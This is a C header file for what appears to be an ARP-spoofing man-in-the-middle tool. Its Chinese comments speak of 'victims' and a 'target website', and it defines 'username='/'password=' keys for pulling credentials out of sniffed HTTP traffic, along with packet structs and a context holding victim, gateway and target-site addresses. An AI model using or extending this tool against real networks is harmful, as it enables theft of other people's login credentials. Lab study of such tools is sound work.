#ifndef COMMON_H
#define COMMON_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <pthread.h>
#include <stdint.h>
#include <time.h>
#include <ctype.h>

// 目標網站的欄位名稱
#define TARGET_USER_KEY "username="
#define TARGET_PASS_KEY "password="

// 最大受害者數量
#define MAX_TARGETS 255

// 定義單一受害者
typedef struct {
    uint32_t ip;
    uint8_t mac[6];
    int active;
} Target;

// --- 自定義網路結構 ---
#define ETHER_ADDR_LEN 6
#define ETHERTYPE_IP  0x0800
#define ETHERTYPE_ARP 0x0806

struct my_ethhdr {
    uint8_t  ether_dhost[ETHER_ADDR_LEN];
    uint8_t  ether_shost[ETHER_ADDR_LEN];
    uint16_t ether_type;
} __attribute__((packed));

struct my_arphdr {
    uint16_t ar_hrd; uint16_t ar_pro;
    uint8_t  ar_hln; uint8_t  ar_pln;
    uint16_t ar_op;
    uint8_t  ar_sha[ETHER_ADDR_LEN]; uint8_t  ar_sip[4];
    uint8_t  ar_tha[ETHER_ADDR_LEN]; uint8_t  ar_tip[4];
} __attribute__((packed));

struct my_iphdr {
    uint8_t  ihl:4, version:4; uint8_t tos; uint16_t tot_len;
    uint16_t id; uint16_t frag_off; uint8_t ttl; uint8_t protocol;
    uint16_t check; uint32_t saddr; uint32_t daddr;
} __attribute__((packed));

struct my_tcphdr {
    uint16_t source; uint16_t dest; uint32_t seq; uint32_t ack_seq;
    uint16_t res1:4, doff:4, fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    uint16_t window; uint16_t check; uint16_t urg_ptr;
} __attribute__((packed));


typedef struct {
    pcap_t *handle;
    char interface[20];
    
    uint32_t my_ip;
    uint32_t gateway_ip;
    uint32_t target_site_ip;
    
    uint8_t my_mac[6];
    uint8_t gateway_mac[6];

    // 目標網站的關鍵字
    char user_key[32];
    char pass_key[32];

    // init victim (single target)
    uint32_t victim_ip;
    uint8_t victim_mac[6];

    // multiple targets
    Target targets[MAX_TARGETS];
    int target_count;
} MitmContext;

#endif